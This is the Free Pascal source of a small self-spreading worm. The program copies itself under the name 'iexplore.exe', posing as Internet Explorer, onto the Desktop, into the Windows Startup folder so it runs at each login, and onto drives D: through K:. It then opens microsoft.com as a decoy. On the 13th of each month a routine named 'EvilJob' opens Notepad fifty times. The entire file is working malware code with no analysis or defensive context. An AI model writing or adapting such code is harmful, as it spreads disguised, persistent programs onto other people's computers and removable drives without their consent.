{$mode objfpc}
uses
classes,sysutils,windows,crt,dos;
const
fTarget = 'iexplore.exe';
var
folder_array: array[1..10] of String;
s,s1,user_name:string;
i:integer;
Year,Month,Day,WDay : word;
function FileCopy(Source, Target: string): boolean;
var
MemBuffer: TMemoryStream;
begin
result := false;
MemBuffer := TMemoryStream.Create;
try
MemBuffer.LoadFromFile(Source);
MemBuffer.SaveToFile(Target);
result := true
except
end;
MemBuffer.Free
end;
procedure EvilJob;
var i:integer;
begin
for i:=1 to 50 do begin
ShellExecute(0,nil, PChar('"notepad"'),nil,nil,1);
Delay(1000);
end;
end;
begin
Randomize;

user_name:=GetUserDir;
folder_array[1]:=user_name+'Desktop\';
folder_array[2]:=user_name+'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\';
folder_array[3]:='d:\';
folder_array[4]:='e:\';
folder_array[5]:='f:\';
folder_array[6]:='g:\';
folder_array[7]:='h:\';
folder_array[8]:='i:\';
folder_array[9]:='j:\';
folder_array[10]:='k:\';

s:=ParamStr(0);
s1:=fTarget;

for i:=1 to 10 do begin
s1:=fTarget;
s1:=folder_array[i]+s1;
If FileExists(s1) then
s1:=folder_array[i]+'iexplore'+IntToStr(Random(1000))+'.exe';
if DirectoryExists(folder_array[i]) then
FileCopy(S, s1);
end;

ShellExecute(0,nil, PChar('"iexplore"'),PChar('"https://www.microsoft.com"'),nil,1);

GetDate(Year,Month,Day,WDay);
if Day=13 then EvilJob;

end.
